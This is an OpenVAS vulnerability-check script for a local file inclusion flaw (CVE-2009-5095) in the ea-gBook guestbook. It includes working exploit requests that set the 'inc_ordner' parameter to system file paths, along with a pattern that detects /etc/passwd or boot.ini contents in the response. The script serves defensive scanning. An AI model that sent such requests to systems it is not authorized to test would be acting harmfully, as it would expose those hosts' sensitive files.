###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ea_gbook_inc_ordner_parameter_lfi_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# ea-gBook 'inc_ordner' Parameter Local File Inclusion Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to gain sensitive
  information.
  Impact Level: Application";
tag_affected = "ea-gBook version 0.1.4 and prior.";
tag_insight = "The flaw is due to improper validation of input passed via
  'inc_ordner' parameter to 'index_inc.php' script, which allows attackers to
  read arbitrary files.";
tag_solution = "No solution or patch is available as of 21th September, 2011. Information
  regarding this issue will be updated once the solution details are available
  For updates refer to http://www.ea-style.de/";
tag_summary = "This host is running ea-gBook and is prone to local file inclusion
  vulnerability.";

if(description)
{
  script_id(901207);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-23 16:39:49 +0200 (Fri, 23 Sep 2011)");
  script_cve_id("CVE-2009-5095");
  script_bugtraq_id(33774);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("ea-gBook 'inc_ordner' Parameter Local File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/33927");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/48759");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/8052/");

  script_description(desc);
  script_summary("Check for local file inclusion vulnerability in ea-gBook");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

# Get the host name
host = get_host_name();
if(!host){
  exit(0);
}

## Check for each possible path
foreach dir (make_list("/ea-gBook", "/gbuch", "/gb", "/guestbook",
                       "/Gaestebuch", cgi_dirs()))
{
  ## Send and Receive the response
  req=string(
        "GET ", dir, "/index.php?seite=0 HTTP/1.1\r\n",
        "Host: ", host, "\r\n",
        "Cookie: PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6\r\n",
        "Cache-Control: max-age=0\r\n\r\n");
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if("<title>ea-gBook" >< res && "ea-style.de" >< res)
  {
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct exploit string
      req=string(
        "GET ", dir, "/index_inc.php?inc_ordner=/", files[file]," HTTP/1.1\r\n",
        "Host: ", host, "\r\n",
        "Cookie: PHPSESSID=i8djnvh2m2dobtp9ujktolpcq6\r\n",
        "Cache-Control: max-age=0\r\n\r\n");

      res = http_keepalive_send_recv(port:port, data:req);

      ## Confirm exploit worked properly or not
      if(egrep(pattern:".*root:.*:0:[01]:.*|\[boot loader\]", string:res))
      {
        security_hole(port:port);
        exit(0);
      }
    }
  }
}
